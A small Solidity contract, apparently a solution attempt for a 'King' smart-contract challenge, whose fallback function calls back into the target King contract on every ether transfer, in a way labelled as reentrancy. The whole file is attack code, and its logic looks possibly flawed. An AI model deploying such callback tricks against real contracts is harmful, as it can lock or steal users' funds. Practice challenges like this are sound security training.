

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './King.sol';





contract reentryAttack {

    King public kingContract;


    constructor(King _kingContract) payable {
        kingContract = _kingContract;
    }


    fallback() external payable {
        (bool success, ) = address(kingContract).call(abi.encodeWithSignature("receive()"));
        require(success);
    }


}